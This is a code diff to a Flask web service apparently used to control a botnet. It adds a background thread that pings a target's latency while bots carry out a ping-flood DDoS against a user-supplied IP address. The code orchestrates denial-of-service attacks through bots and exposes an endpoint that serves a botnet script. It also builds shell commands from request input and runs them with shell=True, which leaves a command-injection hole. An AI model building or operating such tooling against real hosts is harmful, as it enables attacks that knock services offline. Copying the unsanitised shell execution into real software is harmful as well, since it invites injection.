@@ -6,6 +6,7 @@ import socket
 import threading
 from app import db
 import sys
+import datetime
 
 ddosAttack = Blueprint("ddosAttack", __name__, url_prefix="/ddosAttack")
 latencyPingList = []
@@ -18,7 +19,6 @@ def DDOSAttack():
     packetSize = data["packetSize"]
     attackType = data["attackType"]
     duration = data["duration"]
-    latencyPingList.clear()
 
     command = getCommand("DDOS", "PINGFLOOD")
     command = command.format(
@@ -28,35 +28,50 @@ def DDOSAttack():
         ipAddress = ipAddress,
         duration = duration)
 
+    # create thread for latency polling
+    latencyCheck = threading.Thread(target=checkLatencyPeriodically, args=(ipAddress, duration))
+    latencyCheck.start()
+
     # launch dos on bots using a seperate thread
     bots = threading.Thread(target=botnet, args=(command, duration))
     bots.start()
     bots.join()
 
     logActivityDOS("DDOS ATTACK", data, latencyPingList)
+    latencyPingList.clear()
 
     return ""
 
+def checkLatencyPeriodically(ipAddress, duration):
+    command = getCommand("PING", "LATENCY")
+    command = command.format(ipAddress=ipAddress)
+    startTime = datetime.datetime.now()
+    duration = datetime.timedelta(seconds=int(duration))
+
+    # poll for latency every 5 seconds
+    while datetime.datetime.now() - startTime < duration:
+        latency(command)
+        time.sleep(5)
+
 @ddosAttack.post("/latency")
 def checkLatency():
-    data = request.get_json()
-    ipAddress = data["ipAddress"]
+    if len(latencyPingList) > 0:
+        return latencyPingList[-1]
+    else:
+        return ""
 
-    command = getCommand("PING", "LATENCY")
-    command = command.format(ipAddress = ipAddress)
-
+def latency(command):
     pingCommand = subprocess.Popen(command, stdout=subprocess.PIPE, text=True, shell=True)
     output, _ = pingCommand.communicate()  # Capture the output and wait for the process to finish
 
     lines = output.splitlines()
     line = lines[1]
 
+    # append latency ping result to list
     if "time" in line:
         latencyPingList.append('[PING SUCCESS] ' + line)
     else:
         latencyPingList.append('[PING FAILED] ' + line)
-
-    return latencyPingList[-1]
     
 @ddosAttack.get("/botnet")
 def getBotnetScript():
